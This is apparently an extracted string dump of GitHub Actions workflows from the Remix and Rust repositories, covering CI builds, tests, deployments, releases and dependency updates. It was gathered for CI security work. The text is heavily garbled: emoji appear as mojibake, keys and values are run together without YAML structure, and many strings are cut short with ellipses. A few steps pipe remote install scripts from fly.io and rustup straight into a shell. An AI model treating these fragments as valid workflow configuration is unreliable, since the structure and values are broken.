Issuesexperimental:/home/huawei/github-actions-security/.github/workflows/remix-run_remix__deduplicate-lock-file.ymlâš™ï¸ Deduplicate lock file\u2699\ufe0f Dedu ... ck filedev- devpnpm-lock.yaml- pnpm-lock.yamldeduplicate${{ secrets.FORMAT_PAT }}ï¸ï¸âš™ï¸ Deduplicate pnpm-lock.yaml\ufe0f\ufe0f\u2699\ufe0f De ... ck.yamlpnpm dedupe && rm -rf ./node_modules && pnpm installpnpm de ... installname: \ufe0f ... ck.yamlðŸ’ª Commit\u1f4aa\udcaa Commitgit config --local user.email "github-actions[bot]@users.noreply.github.com"
git config --local user.name "github-actions[bot]"

git add .
if [ -z "$(git status --porcelain)" ]; then
  echo "ðŸ’¿ no deduplication needed"
  exit 0
fi
git commit -m "chore: deduplicate pnpm-lock.yaml"
git push
echo "ðŸ’¿ https://github.com/$GITHUB_REPOSITORY/commit/$(git rev-parse HEAD)"
name: \u1f4aa\udcaa Commitif: git ... /remix'deduplicate:name: \u2699 ... ck file/home/huawei/github-actions-security/.github/workflows/remix-run_remix__deployments.ymlðŸš€ Deployment Tests\u1f680\ude80 Deployment TestsTEST_AWS_ACCESS_KEY_IDTEST_AW ... _KEY_IDTEST_AWS_SECRET_ACCESS_KEYTEST_AW ... ESS_KEYTEST_CF_ACCOUNT_IDTEST_CF_GLOBAL_API_KEYTEST_CF ... API_KEYTEST_CF_EMAILTEST_CF_PAGES_API_TOKENTEST_CF ... I_TOKENTEST_CF_API_TOKENTEST_DENO_DEPLOY_TOKENTEST_DE ... Y_TOKENTEST_FLY_TOKENTEST_AW ... KEY_ID:secrets:arc_deployArchitect Deploy./scripts/deployment-test/package.json./scrip ... ge.jsonðŸ“¦ Install latest version of npm\u1f4e6\udce6 Inst ...  of npmnpm install -g npm@latestnpm ins ... @latest./scripts/deployment-test./scrip ... nt-testname: \ud83d ...  of npmðŸ“¥ Install deployment-test deps\u1f4e5\udce5 Inst ... st depsname: \ud83d ... st depsðŸš€ Deploy to Arc\u1f680\ude80 Deploy to Arcnode ./arc.mjs${{ secrets.TEST_AWS_ACCESS_KEY_ID }}${{ secrets.TEST_AWS_SECRET_ACCESS_KEY }}CI: truename: \ud83d ...  to Arcname: A ...  Deploycf_pages_deployCF Pages Deploy"CF Pages Deploy"ðŸš€ Deploy to Cloudflare Pages\u1f680\ude80 Depl ... e Pagesnode ./cf-pages.mjsCLOUDFLARE_ACCOUNT_IDCLOUDFL ... OUNT_ID${{ secrets.TEST_CF_ACCOUNT_ID }}CLOUDFLARE_GLOBAL_API_KEYCLOUDFL ... API_KEY${{ secrets.TEST_CF_GLOBAL_API_KEY }}CLOUDFLARE_EMAIL${{ secrets.TEST_CF_EMAIL }}${{ sec ... MAIL }}CLOUDFLARE_API_TOKEN${{ secrets.TEST_CF_PAGES_API_TOKEN }}CLOUDFL ... T_ID }}name: \ud83d ... e Pagesname: " ... Deploy"cf_workers_deployCF Workers Deploy"CF Workers Deploy"ðŸš€ Deploy to Cloudflare Workers\u1f680\ude80 Depl ... Workersnode ./cf-workers.mjsnode ./ ... ers.mjs${{ secrets.TEST_CF_API_TOKEN }}${{ secrets.CLOUDFLARE_EMAIL }}${{ secrets.CLOUDFLARE_GLOBAL_API_KEY }}name: \ud83d ... Workersdeno_deploy_deployDeno Deploy Deploy"Deno Deploy Deploy"ðŸ¦• Install Deno\u1f995\udd95 Install Denodenoland/setup-deno@v1denolan ... deno@v1vx.x.xdeno-version: vx.x.xname: \ud83e ... ll DenoðŸ¦• Deno Deploy CLI\u1f995\udd95 Deno Deploy CLIdeno install --allow-read --allow-write --allow-env --allow-net --allow-run --no-check -r -f https://deno.land/x/deploy/deployctl.tsdeno in ... yctl.tsname: \ud83e ... loy CLIðŸš€ Deploy to Deno Deploy\u1f680\ude80 Depl ...  Deploynode ./deno-deploy.mjsnode ./ ... loy.mjsDENO_DEPLOY_TOKEN${{ secrets.TEST_DENO_DEPLOY_TOKEN }}DENO_DE ... OKEN }}name: \ud83d ...  Deployfly_deployFly Deploy"Fly Deploy"ðŸŽˆ Install the Fly CLI\u1f388\udf88 Inst ... Fly CLIcurl -L https://fly.io/install.sh | FLYCTL_INSTALL=/usr/local shcurl -L ... ocal shname: \ud83c ... Fly CLIðŸš€ Deploy to Fly\u1f680\ude80 Deploy to Flynode ./fly.mjsFLY_API_TOKEN${{ secrets.TEST_FLY_TOKEN }}FLY_API ... OKEN }}name: \ud83d ...  to Flyname: "Fly Deploy"arc_deploy:name: \ud83d ... t Tests/home/huawei/github-actions-security/.github/workflows/remix-run_remix__format.ymlðŸ‘” Format\u1f454\udc54 FormatðŸ”— Convert Docs links to references\u1f517\udd17 Conv ... erencesnode scripts/markdown-references.mjsnode sc ... ces.mjsname: \ud83d ... erencesðŸ”ƒ Sort contributors.yml\u1f503\udd03 Sort ... ors.ymlsort --ignore-case --output contributors.yml contributors.ymlsort -- ... ors.ymlname: \ud83d ... ors.ymlpnpm formatname: \u1f454\udc54 FormatðŸ‘” Format Deno files\u1f454\udc54 Format Deno filespnpm format:denoname: \ud83d ... o filesgit config --local user.email "hello@remix.run"
git config --local user.name "Remix Run Bot"

git add .
if [ -z "$(git status --porcelain)" ]; then
  echo "ðŸ’¿ no formatting changed"
  exit 0
fi
git commit -m "chore: format"
git push
echo "ðŸ’¿ pushed formatting changes https://github.com/$GITHUB_REPOSITORY/commit/$(git rev-parse HEAD)"
format:/home/huawei/github-actions-security/.github/workflows/remix-run_remix__lint.ymlâ¬£ Lint\u2b23 LintDisable GitHub Actions AnnotationsDisable ... tationsecho "::remove-matcher owner=tsc::"
echo "::remove-matcher owner=eslint-compact::"
echo "::remove-matcher owner=eslint-stylish::"
name: D ... tationsðŸ”¬ Lint\u1f52c\udd2c Lintpnpm lintname: \u1f52c\udd2c LintðŸ”¬ Lint deno files\u1f52c\udd2c Lint deno filespnpm lint:denoname: \u2b23 Lint/home/huawei/github-actions-security/.github/workflows/remix-run_remix__merged-pr.ymlðŸ“¦ Merged PR\u1f4e6\udce6 Merged PRpackages/**"packages/**"- "packages/**"mergedAdd label to merged PRAdd lab ... rged PRgithub.event.pull_request.merged == true && github.repository == 'remix-run/remix'await github.rest.issues.addLabels({
  owner: context.repo.owner,
  repo: context.repo.repo,
  issue_number: context.issue.number,
  labels: ['awaiting release'],
})
- uses: ... ript@v7name: A ... rged PRmerged:name: \u1f4e6\udce6 Merged PR/home/huawei/github-actions-security/.github/workflows/remix-run_remix__nightly.ymlðŸŒ’ Nightly Release\u1f312\udf12 Nightly Release"0 7 * * *"cron: " ... 2AM PST- cron: ... 2AM PSTNEXT_VERSION${{ steps.version.outputs.NEXT_VERSION }}NEXT_VE ... SION }}${{ secrets.NIGHTLY_PAT }}ref: devðŸ•µï¸ Check for changes\u1f575\udd75\ufe0f Che ... changesSHORT_SHA=$(git rev-parse --short HEAD)

# get latest nightly tag
LATEST_NIGHTLY_TAG=$(git tag -l v0.0.0-nightly-\* --sort=-creatordate | head -n 1)

# check if last commit to dev starts would be the nightly tag we're about to create (minus the date)
# if it is, we'll skip the nightly creation
# if not, we'll create a new nightly tag
if [[ ${LATEST_NIGHTLY_TAG} == v0.0.0-nightly-${SHORT_SHA}-* ]]; then
  echo "ðŸ›‘ Latest nightly tag is the same as the latest commit sha, skipping nightly release"
else
  # yyyyMMdd format (e.g. 20221207)
  DATE=$(date '+%Y%m%d')
  # v0.0.0-nightly-<short sha>-<date>
  NEXT_VERSION=0.0.0-nightly-${SHORT_SHA}-${DATE}
  # set output so it can be used in other jobs
  echo "NEXT_VERSION=${NEXT_VERSION}" >> $GITHUB_OUTPUT
fi
name: \ud83d ... changesâ¤´ï¸ Update version\u2934\ufe0f Update versionsteps.version.outputs.NEXT_VERSIONsteps.v ... VERSIONgit config --local user.email "hello@remix.run"
git config --local user.name "Remix Run Bot"
git checkout -b nightly/${{ steps.version.outputs.NEXT_VERSION }}
pnpm run version ${{steps.version.outputs.NEXT_VERSION}} --skip-prompt
git push origin --tags
name: \u2934 ... versionðŸ— Build\u1f3d7\udfd7 Buildpnpm buildname: \u1f3d7\udfd7 BuildðŸ” Setup npm auth\u1f510\udd10 Setup npm authecho "registry=https://registry.npmjs.org" >> ~/.npmrc
echo "//registry.npmjs.org/:_authToken=${{ secrets.NPM_TOKEN }}" >> ~/.npmrc
name: \ud83d ... pm authðŸš€ Publish\u1f680\ude80 Publishnpm run publishname: \u1f680\ude80 Publishname: \ud83c ... Release[nightly]ðŸ“ Comment on related issues and pull requests\u1f4dd\udcdd Comm ... equestsgithub.repository == 'remix-run/remix' && needs.nightly.outputs.NEXT_VERSIONgithub. ... VERSION./.github/workflows/release-comments.yml./.gith ... nts.ymlneeds: [nightly]deploymentsremix-run/remix/.github/workflows/deployments.yml@mainremix-r ... ml@mainTEST_AW ... Y_ID }}stacksðŸ¥ž Remix Stacks Test\u1f95e\udd5e Remix Stacks Testremix-run/remix/.github/workflows/stacks.yml@main${{ needs.nightly.outputs.NEXT_VERSION }}"${{ ne ... ION }}"version ... ION }}"nightly:/home/huawei/github-actions-security/.github/workflows/remix-run_remix__no-response.ymlðŸ¥º No Response\u1f97a\udd7a No Response5 * * * *"5 * * * *"cron: "5 * * * *"- cron: "5 * * * *"ðŸ¥º Handle Ghosting\u1f97a\udd7a Handle GhostingThis issue has been automatically closed because we haven't received a response from the original author ðŸ™ˆ. This automation helps keep the issue tracker clean from issues that are unactionable. Please reach out if you have more information for us! ðŸ™‚
This PR has been automatically closed because we haven't received a response from the original author ðŸ™ˆ. This automation helps keep the issue tracker clean from PRs that are unactionable. Please reach out if you have more information for us! ðŸ™‚
needs-responsedays-be ... ose: 10name: \ud83e ... hosting- name: ... hostingname: \u1f97a\udd7a No Response/home/huawei/github-actions-security/.github/workflows/remix-run_remix__release-comments.ymlðŸ“ Comment on Release\u1f4dd\udcdd Comm ... Releaseremix-run/release-comment-action@v0.4.1remix-r ... @v0.4.1DIRECTORY_TO_CHECK./packages"./packages"PACKAGE_NAMEremix"remix"PR_LABELS_TO_REMOVEawaiting release"awaiting release"DIRECTO ... ckages"name: \ud83d ... equestsname: \ud83d ... Release/home/huawei/github-actions-security/.github/workflows/remix-run_remix__release-experimental.ymlðŸ§ª Experimental Release\u1f9ea\uddea Expe ... Release${{ github.event.inputs.branch }}git config --local user.email "hello@remix.run"
git config --local user.name "Remix Run Bot"
SHORT_SHA=$(git rev-parse --short HEAD)
NEXT_VERSION=0.0.0-experimental-${SHORT_SHA}
git checkout -b experimental/${NEXT_VERSION}
pnpm run version ${NEXT_VERSION} --skip-prompt
git push origin --tags
pnpm run publishname: \ud83e ... Release/home/huawei/github-actions-security/.github/workflows/remix-run_remix__release.ymlðŸ¦‹ Changesets Release\u1f98b\udd8b Chan ... Release"release-*"!release-experimental"!relea ... mental"!release-experimental-*"!relea ... ntal-*"!release-manual"!release-manual"!release-manual-*"!release-manual-*"- releasegithub.repository == 'remix-run/remix' &&
!contains(github.ref, 'nightly')
published_packages${{ steps.changesets.outputs.publishedPackages }}${{ ste ... ages }}${{ steps.changesets.outputs.published }}${{ ste ... shed }}publish ... ages }}ðŸš€ PR / Publish\u1f680\ude80 PR / Publishchangesetschangesets/action@v1pnpm run changeset:versionpnpm ru ... versioncommitchore: Update version for release"chore: ... elease"pnpm run changeset:releasepnpm ru ... releasecreateGithubReleasesversion ... versionname: \ud83d ... Publishfind_package_versionðŸ¦‹ Find Package\u1f98b\udd8b Find Package[release]github.repository == 'remix-run/remix' && needs.release.outputs.published == 'true'github. ...  'true'${{ steps.find_package_version.outputs.package_version }}package ... sion }}package_version=$(node ./scripts/find-release-from-changeset.js)
echo "package_version=${package_version}" >> $GITHUB_OUTPUT
PACKAGE_VERSION_TO_FOLLOWPACKAGE ... _FOLLOWPUBLISHED_PACKAGES${{ needs.release.outputs.published_packages }}${{ nee ... ages }}PACKAGE ... "remix"id: fin ... versionname: \ud83e ... Packagegithub.repository == 'remix-run/remix' && needs.find_package_version.outputs.package_version != ''github. ... n != ''[releas ... ersion]/home/huawei/github-actions-security/.github/workflows/remix-run_remix__shared-build.ymlðŸ› ï¸ Build\u1f6e0\udee0\ufe0f BuildCYPRESS_INSTALL_BINARYCYPRESS ... _BINARYname: \u1f6e0\udee0\ufe0f Build/home/huawei/github-actions-security/.github/workflows/remix-run_remix__shared-test-integration.ymlðŸ§ª Test (Integration)\u1f9ea\uddea Test ... ration)node_versionintegration${{ inputs.os }} / node@${{ matrix.node }} / ${{ matrix.browser }}"${{ in ... ser }}"${{ fromJSON(inputs.node_version) }}${{ fro ... ion) }}${{ fromJSON(inputs.browser) }}${{ fro ... ser) }}node: $ ... ion) }}${{ inputs.os }}âŽ” Setup node ${{ matrix.node }}\u2394 Setup ... node }}${{ matrix.node }}node-ve ... node }}name: \u2394 ... node }}ðŸ“¥ Install Playwright\u1f4e5\udce5 Inst ... ywrightnpx playwright install --with-deps ${{ matrix.browser }}npx pla ... wser }}name: \ud83d ... ywrightðŸ‘€ Run Integration Tests ${{ matrix.browser }}\u1f440\udc40 Run  ... wser }}pnpm test:integration --project=${{ matrix.browser }}"pnpm t ... ser }}"name: \ud83d ... wser }}name: " ... ser }}"integration:name: \ud83e ... ration)/home/huawei/github-actions-security/.github/workflows/remix-run_remix__shared-test-unit.ymlðŸ§ª Test (Unit)\u1f9ea\uddea Test (Unit)${{ inputs.os }} / node@${{ matrix.node }}"${{ in ... ode }}"ðŸ§ª Run Primary Tests\u1f9ea\uddea Run Primary Testspnpm test:primary"pnpm test:primary"name: \ud83e ... y Testsname: " ... ode }}"name: \u1f9ea\uddea Test (Unit)/home/huawei/github-actions-security/.github/workflows/remix-run_remix__stacks.ymlRemix Stacks Teststackremix-run/indie-stack"remix- ... -stack"indie"indie"repo: " ... -stack"remix-run/blues-stackblues"blues"remix-run/grunge-stackgrunge"grunge"- repo: ... -stack"stack:âš’ï¸ Create new ${{ matrix.stack.name }} app with ${{ inputs.version }}\u2692\ufe0f Crea ... sion }}npx -y create-remix@${{ inputs.version }} ${{ matrix.stack.name }} --template ${{ matrix.stack.repo }} --no-install --no-git-init
name: \u2692 ... sion }}âŽ” Setup dependency caching\u2394 Setup ... caching${{ matrix.stack.name }}/package.json${{ mat ... ge.jsoncache: npmname: \u2394 ... caching${{ matrix.stack.name }}Run `remix init`cd ${{ matrix.stack.name }}
npx remix init
name: R ... x init`ðŸ„ Copy test env vars\u1f3c4\udfc4 Copy ... nv varscd ${{ matrix.stack.name }}
cp .env.example .env
name: \ud83c ... nv varsðŸ“ Zip artifact\u1f4c1\udcc1 Zip artifactzip ${{ matrix.stack.name }}.zip ./${{ matrix.stack.name }} -r -x "**/node_modules/*"zip ${{ ... ules/*"name: \ud83d ... rtifactðŸ—„ï¸ Archive ${{ matrix.stack.name }}\u1f5c4\uddc4\ufe0f Arc ... name }}${{ matrix.stack.name }}-archive${{ mat ... archive${{ matrix.stack.name }}.zip${{ mat ...  }}.zipname: $ ... archivename: \ud83d ... name }}- name: \u2394 Setup nodename: R ... ks Testâ¬£ ESLint\u2b23 ESLint[setup]ðŸ—„ï¸ Restore ${{ matrix.stack.name }}\u1f5c4\uddc4\ufe0f Res ... name }}ðŸ“ Unzip artifact\u1f4c1\udcc1 Unzip artifactunzip ${{ matrix.stack.name }}.zipunzip $ ...  }}.zipâŽ” Setup node and dependency cachingcd ${{ matrix.stack.name }}
npm run lint
- name: ... name }}name: \u2b23 ESLintÊ¦ TypeScript\u02a6 TypeScriptðŸ”Ž Type check\u1f50e\udd0e Type checkcd ${{ matrix.stack.name }}
npm run typecheck --if-present
name: \u1f50e\udd0e Type checkname: \u02a6 TypeScriptvitestâš¡ Vitest\u26a1 Vitestâš¡ Run vitest\u26a1 Run vitestcd ${{ matrix.stack.name }}
npm run test -- --coverage
name: \u26a1 Run vitestname: \u26a1 Vitestcypressâš«ï¸ Cypress\u26ab\ufe0f Cypressnpm run start:mocks"npm ru ... :mocks"npm run dev"npm run dev"ðŸ³ Docker compose\u1f433\udc33 Docker compose${{ matrix.stack.name == 'blues' }}${{ mat ... ues' }}cd ${{ matrix.stack.name }}
docker-compose up -d && sleep 3
DATABASE_URLpostgresql://postgres:postgres@localhost:5432/postgres"postgr ... stgres"DATABAS ... stgres"name: \ud83d ... composeðŸ›  Setup Database\u1f6e0\udee0 Setup Database${{ matrix.stack.name != 'grunge' }}${{ mat ... nge' }}cd ${{ matrix.stack.name }}
npx prisma migrate reset --force
name: \ud83d ... atabaseâš™ï¸ Build\u2699\ufe0f Buildcd ${{ matrix.stack.name }}
npm run build
name: \u2699\ufe0f BuildðŸŒ³ Cypress run\u1f333\udf33 Cypress runcypress-io/github-action@v6cypress ... tion@v6start${{ matrix.stack.cypress }}${{ mat ... ress }}wait-onhttp://localhost:8811"http:/ ... t:8811"start:  ... ress }}8811"8811"PORT: "8811"name: \u1f333\udf33 Cypress runname: \u26ab\ufe0f Cypressname: \ud83e ... ks Test/home/huawei/github-actions-security/.github/workflows/remix-run_remix__test-full.ymlBranchv0.0.0-nightly-*"v0.0.0-nightly-*"- "v0.0.0-nightly-*""docs/**"scripts/**"scripts/**"contributors.yml"contributors.yml""**/*.md"- "docs/**""\u2699\ufe0f Build"./.github/workflows/shared-build.ymlname: "\u2699\ufe0f Build"unit-ubuntuðŸ§ª Unit Test"\u1f9ea\uddea Unit Test"./.github/workflows/shared-test-unit.yml./.gith ... nit.yml"[18, 20]"os: "ubuntu-latest"name: "\u1f9ea\uddea Unit Test"unit-windows"windows-latest"os: "windows-latest"integration-ubuntuðŸ‘€ Integration Test"\u1f440\udc40 Int ... n Test"./.github/workflows/shared-test-integration.yml["chromium", "firefox"]'["chro ... efox"]'name: " ... n Test"integration-windows["msedge"]'["msedge"]'integration-macos"macos-latest"["webkit"]'["webkit"]'os: "macos-latest"name: Branch/home/huawei/github-actions-security/.github/workflows/remix-run_remix__test-pr-ubuntu.ymlPR (Base)templates/**"templates/**"[20]"[20]"integration-chromium["chromium"]'["chromium"]'name: PR (Base)/home/huawei/github-actions-security/.github/workflows/remix-run_remix__test-pr-windows-macos.ymlPR (Full)packages/create-remix/**"packag ... mix/**"packages/remix-dev/**"packag ... dev/**"!**/*.md"!**/*.md"- "pack ... mix/**"integration-firefox["firefox"]'["firefox"]'integration-msedgeintegration-webkitunit-windows:name: PR (Full)/home/huawei/github-actions-security/.github/workflows/remix-run_remix__website.ymlðŸŒ Website\u1f310\udf10 Website[main, dev][docs/**]branche ... n, dev]websiteðŸ”„ Refresh the docs\u1f504\udd04 Refresh the docsfjogeleit/http-request-action@v1fjogele ... tion@v1${{ secrets.DOCS_REFRESH_URL }}?ref=${{ github.ref }}"${{ se ... ref }}"methodPOST"POST"customHeaders{"Authorization": "${{ secrets.DOCS_REFRESH_TOKEN }}"}'{"Auth ... N }}"}'url: "$ ... ref }}"name: \ud83d ... he docs- name: ... he docswebsite:name: \u1f310\udf10 Website/home/huawei/github-actions-security/.github/workflows/rust-lang_rust__ci.ymltrytry-perfautomation/bors/try- auto${{ github.workflow }}-${{ ((github.ref == 'refs/heads/try' || github.ref == 'refs/heads/try-perf') && github.sha) || github.ref }}TOOLSTATE_REPOhttps://github.com/rust-lang-nursery/rust-toolstate"https: ... lstate"TOOLSTATE_REPO_ACCESS_TOKENTOOLSTA ... S_TOKEN${{ secrets.TOOLSTATE_REPO_ACCESS_TOKEN }}TOOLSTA ... lstate"calculate_matrixCalculate job matrix${{ steps.jobs.outputs.jobs }}${{ ste ... jobs }}run_type${{ steps.jobs.outputs.run_type }}jobs: $ ... jobs }}Checkout the source codeCheckou ... ce codename: C ... ce codeCache citoolSwatinem/rust-cache@9d47c6ad4b02e050fd481d890b2ea34778fd09d6Swatine ... 8fd09d6workspacessrc/ci/citoolworkspa ... /citoolname: Cache citoolCalculate the CI job matrixCalcula ...  matrixCOMMIT_MESSAGE${{ github.event.head_commit.message }}${{ git ... sage }}COMMIT_ ... sage }}cd src/ci/citool
CARGO_INCREMENTAL=0 cargo test
CARGO_INCREMENTAL=0 cargo run calculate-job-matrix >> $GITHUB_OUTPUT
${{ matrix.full_name }}[ calculate_matrix ]"${{ matrix.os }}"CI_JOB_NAMECI_JOB_DOC_URL${{ matrix.doc_url }}${{ mat ... _url }}GITHUB_WORKFLOW_RUN_IDGITHUB_ ... _RUN_IDCARGO_REGISTRIES_CRATES_IO_PROTOCOLCARGO_R ... ROTOCOLsparserust-lang-ci-sccache2rust-la ... ccache2us-west-1CACHE_DOMAINci-caches.rust-lang.orgci-cach ... ang.orgCI_JOB_ ... name }}${{ matrix.continue_on_error || false }}${{ mat ... alse }}${{ fromJSON(needs.calculate_matrix.outputs.jobs) }}${{ fro ... obs) }}include ... obs) }}Install cargo in AWS CodeBuildInstall ... deBuildmatrix.codebuild# Check if cargo is installed
if ! command -v cargo &> /dev/null; then
  echo "Cargo not found, installing Rust..."
  curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh -s -- -y --profile=minimal
  # Make cargo available in PATH
  echo "$HOME/.cargo/bin" >> $GITHUB_PATH
fi
name: I ... deBuilddisable git crlf conversiondisable ... versiongit config --global core.autocrlf falsegit con ... f falsename: d ... versioncheckout the source codecheckou ... ce codename: c ... ce codefree up disk spacesrc/ci/scripts/free-disk-space.shsrc/ci/ ... pace.shmatrix.free_diskname: f ... k spaceconfigure the PR in which the error message will be postedconfigu ...  postedecho "[CI_PR_NUMBER=$num]"echo "[ ... =$num]"numnum: ${ ... mber }}needs.calculate_matrix.outputs.run_type == 'pr'needs.c ... == 'pr'name: c ...  postedadd extra environment variablesadd ext ... riablessrc/ci/scripts/setup-environment.shsrc/ci/ ... ment.shEXTRA_VARIABLES${{ toJson(matrix.env) }}${{ toJ ... env) }}EXTRA_V ... env) }}name: a ... riablesensure the channel matches the target branchensure  ...  branchsrc/ci/scripts/verify-channel.shsrc/ci/ ... nnel.shname: e ...  branchcollect CPU statisticscollect ... tisticssrc/ci/scripts/collect-cpu-stats.shsrc/ci/ ... tats.shname: c ... tisticsshow the current environmentshow th ... ronmentsrc/ci/scripts/dump-environment.shname: s ... ronmentinstall awsclisrc/ci/scripts/install-awscli.shsrc/ci/ ... scli.shname: install awscliinstall sccachesrc/ci/scripts/install-sccache.shsrc/ci/ ... ache.shname: i ... sccacheselect Xcodesrc/ci/scripts/select-xcode.shsrc/ci/ ... code.shname: select Xcodeinstall clangsrc/ci/scripts/install-clang.shsrc/ci/ ... lang.shname: install clanginstall tidysrc/ci/scripts/install-tidy.shsrc/ci/ ... tidy.shname: install tidyinstall WIXsrc/ci/scripts/install-wix.shsrc/ci/ ... -wix.shname: install WIXsrc/ci/scripts/disable-git-crlf-conversion.shsrc/ci/ ... sion.shcheckout submodulessrc/ci/scripts/checkout-submodules.shsrc/ci/ ... ules.shname: c ... modulesinstall MinGWsrc/ci/scripts/install-mingw.shsrc/ci/ ... ingw.shname: install MinGWinstall ninjasrc/ci/scripts/install-ninja.shsrc/ci/ ... inja.shname: install ninjaenable ipv6 on Dockerenable  ...  Docker${{ !matrix.codebuild }}${{ !ma ... uild }}src/ci/scripts/enable-docker-ipv6.shsrc/ci/ ... ipv6.shname: e ...  Dockerensure line endings are correctensure  ... correctsrc/ci/scripts/verify-line-endings.shsrc/ci/ ... ings.shname: e ... correctensure backported commits are in upstream branchesensure  ... ranchessrc/ci/scripts/verify-backported-commits.shsrc/ci/ ... mits.shname: e ... ranchesensure the stable version number is correctsrc/ci/scripts/verify-stable-version-number.shsrc/ci/ ... mber.shbuild citoolcd src/ci/citool
CARGO_INCREMENTAL=0 CARGO_TARGET_DIR=../../../build/citool cargo build
name: build citoolrun the buildset +e
# Redirect stderr to stdout to avoid reordering the two streams in the GHA logs.
src/ci/scripts/run-build-from-ci.sh 2>&1
STATUS=$?
set -e

if [[ "$STATUS" -ne 0 && -n "$CI_JOB_DOC_URL" ]]; then
  echo "****************************************************************************"
  echo "To find more information about this job, visit the following URL:"
  echo "$CI_JOB_DOC_URL"
  echo "****************************************************************************"
fi
exit ${STATUS}
${{ env.CACHES_AWS_ACCESS_KEY_ID }}${{ env ... Y_ID }}${{ secrets[format('AWS_SECRET_ACCESS_KEY_{0}', env.CACHES_AWS_ACCESS_KEY_ID)] }}${{ sec ... ID)] }}AWS_ACC ... Y_ID }}name: run the buildcreate github artifactscreate  ... tifactssrc/ci/scripts/create-doc-artifacts.shsrc/ci/ ... acts.shname: c ... tifactsprint disk usageecho "disk usage:"
df -h
name: p ... k usageupload artifacts to githubupload  ...  github${{ env.DOC_ARTIFACT_NAME }}obj/artifacts/docname: u ...  githubupload artifacts to S3upload  ... s to S3src/ci/scripts/upload-artifacts.sh${{ env.ARTIFACTS_AWS_ACCESS_KEY_ID }}${{ secrets[format('AWS_SECRET_ACCESS_KEY_{0}', env.ARTIFACTS_AWS_ACCESS_KEY_ID)] }}github.event_name == 'push' || env.DEPLOY == '1' || env.DEPLOY_ALT == '1'github. ...  == '1'name: u ... s to S3postprocess metrics into the summarypostpro ... summaryif [ -f build/metrics.json ]; then
  METRICS=build/metrics.json
elif [ -f obj/build/metrics.json ]; then
  METRICS=obj/build/metrics.json
else
  echo "No metrics.json found"
  exit 0
fi

# Get closest bors merge commit
PARENT_COMMIT=`git rev-list --author='bors <bors@rust-lang.org>' -n1 --first-parent HEAD^1`

./build/citool/debug/citool postprocess-metrics \
    --job-name ${CI_JOB_NAME} \
    --parent ${PARENT_COMMIT} \
    ${METRICS} >> ${GITHUB_STEP_SUMMARY}
name: p ... summaryupload job metrics to DataDogupload  ... DataDogneeds.calculate_matrix.outputs.run_type != 'pr'needs.c ... != 'pr'DATADOG_API_KEYDD_GITHUB_JOB_NAMEDATADOG ... _KEY }}./build/citool/debug/citool upload-build-metrics build/cpu-usage.csv./build ... age.csvname: u ... DataDog- name: ... deBuildoutcomebors build finished[ calcu ... , job ]${{ !cancelled() && contains(fromJSON('["auto", "try"]'), needs.calculate_matrix.outputs.run_type) }}${{ !ca ... ype) }}calculate the correct exit statuscalcula ...  statusjq --exit-status 'all(.result == "success" or .result == "skipped")' <<< '${{ toJson(needs) }}'jq --ex ... ds) }}'name: c ...  statuspublish toolstatesrc/ci/publish_toolstate.shsrc/ci/ ... tate.shneeds.calculate_matrix.outputs.run_type == 'auto'needs.c ...  'auto'TOOLSTATE_ISSUES_API_URLTOOLSTA ... API_URLhttps://api.github.com/repos/rust-lang/rust/issueshttps:/ ... /issuesTOOLSTATE_PUBLISHTOOLSTA ... /issuesname: p ... olstatename: b ... inishedcalculate_matrix:/home/huawei/github-actions-security/.github/workflows/rust-lang_rust__dependencies.ymlBump dependencies in Cargo.lockBump de ... go.lock0 0 * * Sun'0 0 * * Sun'cron: '0 0 * * Sun'- cron: ...  * Sun'RUSTC_BOOTSTRAPWeekly `cargo update`Weekly  ... update`PR_MESSAGEAutomation to keep dependencies in `Cargo.lock` current.

The following is the output from `cargo update`:
cargo update 

"cargo update \n\n"RUSTC_BOOTSTRAP: 1not-waiting-on-borsgithub.repository_owner == 'rust-lang'github. ... t-lang'skip if S-waiting-on-borsskip if ... on-bors# Fetch state and labels of PR
# Or exit successfully if PR does not exist
JSON=$(gh pr view cargo_update --repo $GITHUB_REPOSITORY --json labels,state || exit 0)
STATE=$(echo "$JSON" | jq -r '.state')
WAITING_ON_BORS=$(echo "$JSON" | jq '.labels[] | any(.name == "S-waiting-on-bors"; .)')

# Exit with error if open and S-waiting-on-bors
if [[ "$STATE" == "OPEN" && "$WAITING_ON_BORS" == "true" ]]; then
  exit 1
fi
if: git ... t-lang'update dependenciesinstall the bootstrap toolchaininstall ... olchain# Extract the stage0 version
TOOLCHAIN=$(awk -F= '{a[$1]=$2} END {print(a["compiler_version"] "-" a["compiler_date"])}' src/stage0)
# Install and set as default
rustup toolchain install --no-self-update --profile minimal $TOOLCHAIN
rustup default $TOOLCHAIN
name: i ... olchaincargo update compiler & toolscargo u ... & toolsecho -e "\ncompiler & tools dependencies:" >> cargo_update.log
cargo update 2>&1 | sed '/crates.io index/d' | tee -a cargo_update.log
name: c ... & toolscargo update libraryecho -e "\nlibrary dependencies:" >> cargo_update.log
cargo update --manifest-path library/Cargo.toml 2>&1 | sed '/crates.io index/d' | tee -a cargo_update.log
name: c ... librarycargo update rustbookcargo u ... ustbookecho -e "\nrustbook dependencies:" >> cargo_update.log
cargo update --manifest-path src/tools/rustbook/Cargo.toml 2>&1 | sed '/crates.io index/d' | tee -a cargo_update.log
name: c ... ustbookupload Cargo.lock artifact for use in PRupload  ... e in PRCargo-lockCargo.lock
library/Cargo.lock
src/tools/rustbook/Cargo.lock
name: Cargo-lockname: u ... e in PRupload cargo-update log artifact for use in PRcargo-updatescargo_update.logname: cargo-updatesamend PRdownload Cargo.lock from update jobdownloa ... ate jobname: d ... ate jobdownload cargo-update log from update jobcraft PR body and commit messagecraft P ... messageecho "${COMMIT_MESSAGE}" > commit.txt
cat cargo_update.log >> commit.txt

echo "${PR_MESSAGE}" > body.md
echo '```txt' >> body.md
cat cargo_update.log >> body.md
echo '```' >> body.md
name: c ... messagegit config user.name github-actions
git config user.email github-actions@github.com
git switch --force-create cargo_update
git add ./Cargo.lock ./library/Cargo.lock ./src/tools/rustbook/Cargo.lock
git commit --no-verify --file=commit.txt
name: commitgit push --no-verify --force --set-upstream origin cargo_updategit pus ... _updatename: pushedit existing open pull requestedit ex ... requestedit# Exit with error if PR is closed
STATE=$(gh pr view cargo_update --repo $GITHUB_REPOSITORY --json state --jq '.state')
if [[ "$STATE" != "OPEN" ]]; then
  exit 1
fi

gh pr edit cargo_update --title "${PR_TITLE}" --body-file body.md --repo $GITHUB_REPOSITORY
